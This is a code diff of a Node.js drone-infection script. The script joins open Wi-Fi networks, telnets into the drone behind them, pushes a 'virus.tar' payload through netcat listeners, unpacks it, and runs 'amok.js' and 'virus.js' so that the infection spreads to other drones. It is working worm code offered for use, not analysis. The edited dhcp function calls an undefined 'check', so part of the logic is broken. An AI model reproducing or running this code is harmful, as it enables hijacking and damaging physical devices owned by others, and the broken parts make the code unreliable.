@@ -22,13 +22,18 @@ function attack () {
         var open = nodes.filter(function (node) {
             return node.encrypted === false;
         });
+        //*
         open = [
             {
                 'essid' : 'WindowsAzureDrone5',
                 'address' : '90:03:B7:2A:EA:6C'
             }
         ];
+        //*/
         var ap = open[Math.floor(Math.random() * open.length)];
+        console.log('==================================================');
+        console.log(ap);
+        console.log('==================================================');
         if (!ap) return setTimeout(attack, 5000);
         
         iw.connect(ap.essid, function (err) {
@@ -53,19 +58,21 @@ function dhcp (cb) {
         cb('timed out');
     }, 15 * 1000);
     
-    (function retry () {
+    function retry () {
         if (failed) return;
         
         var ps = spawn('dhclient', [ iw.iface ]);
-        ps.on('exit', function () {
-            getAddr(function (addr) {
-                if (/^192\.168\./.test(addr)) {
-                    clearTimeout(to0);
-                    clearTimeout(to1);
-                    cb(null);
-                }
-                else to1 = setTimeout(retry, 5000);
-            });
+        ps.on('exit', check);
+    }
+    
+    (function () {
+        getAddr(function (addr) {
+            if (/^192\.168\./.test(addr)) {
+                clearTimeout(to0);
+                clearTimeout(to1);
+                cb(null);
+            }
+            else to1 = setTimeout(retry, 5000);
         });
     })();
 }
@@ -84,7 +91,7 @@ function telnet (addr) {
     process.stdin.pipe(s);
     process.stdin.resume();
     
-    var pending = 6;
+    var pending = 1;
     s.on('data', function ondata (buf) {
         if (/THIS DRONE IS INFECTED/.test(buf)) {
             console.log('already infected');
@@ -94,21 +101,21 @@ function telnet (addr) {
         String(buf).split('\n').forEach(function (line) {
             if (/\+ Done/.test(line)) {
                 pending --;
-                if (pending === 0) done();
+                if (pending === 0) setTimeout(done, 2000);
             }
         });
         
         function done () {
             s.removeListener('data', ondata);
-            s.write('tar xf ar-drone.tar\n');
+            s.write('tar xf virus.tar\n');
             
             setTimeout(function () {
-                s.write('./node amok.js &\n');
+                s.write('../node amok.js &\n');
+            }, 5 * 1000);
+            
+            setTimeout(function () {
+                s.write('../node virus.js &\n');
             }, 10 * 1000);
-            
-            setTimeout(function () {
-                s.write('./node virus.js &\n');
-            }, 15 * 1000);
         }
     });
     
@@ -120,51 +127,12 @@ function telnet (addr) {
         s.write('cd /data/video/virus\n');
         
         var port = 1000 + Math.floor(64536 * Math.random());
-        s.write('nc -lp ' + port + ' > node &\n');
+        s.write('nc -lp ' + port + ' > virus.tar &\n');
         setTimeout(function () {
-            fs.createReadStream(process.execPath)
+            fs.createReadStream(__dirname + '/virus.tar')
                 .pipe(net.connect(port, addr))
             ;
         }, 3000);
-        
-        s.write('nc -lp ' + (port + 1) + ' > ar-drone.tar &\n');
-        setTimeout(function () {
-            fs.createReadStream(__dirname + '/ar-drone.tar')
-                .pipe(net.connect(port + 1, addr))
-            ;
-        }, 3000);
-        
-        s.write('nc -lp ' + (port + 2) + ' > amok.js &\n');
-        setTimeout(function () {
-            fs.createReadStream(__dirname + '/amok.js')
-                .pipe(net.connect(port + 2, addr))
-            ;
-        }, 3000);
-        
-        s.write('nc -lp ' + (port + 3) + ' > virus.js &\n');
-        setTimeout(function () {
-            fs.createReadStream(__dirname + '/virus.js')
-                .pipe(net.connect(port + 3, addr))
-            ;
-        }, 3000);
-        
-        s.write('nc -lp ' + (port + 4) + ' > nodes.json &\n');
-        setTimeout(function () {
-            fs.createReadStream(__dirname + '/nodes.json')
-                .pipe(net.connect(port + 4, addr))
-            ;
-        }, 3000);
-        
-        s.write('nc -lp ' + (port + 5) + ' > lib/iw.js &\n');
-        setTimeout(function () {
-            fs.createReadStream(__dirname + '/lib/iw.js')
-                .pipe(net.connect(port + 5, addr))
-            ;
-        }, 3000);
-        
-        setTimeout(function () {
-            s.write('\n');
-        }, 20 * 1000);
     });
     return s;
 }
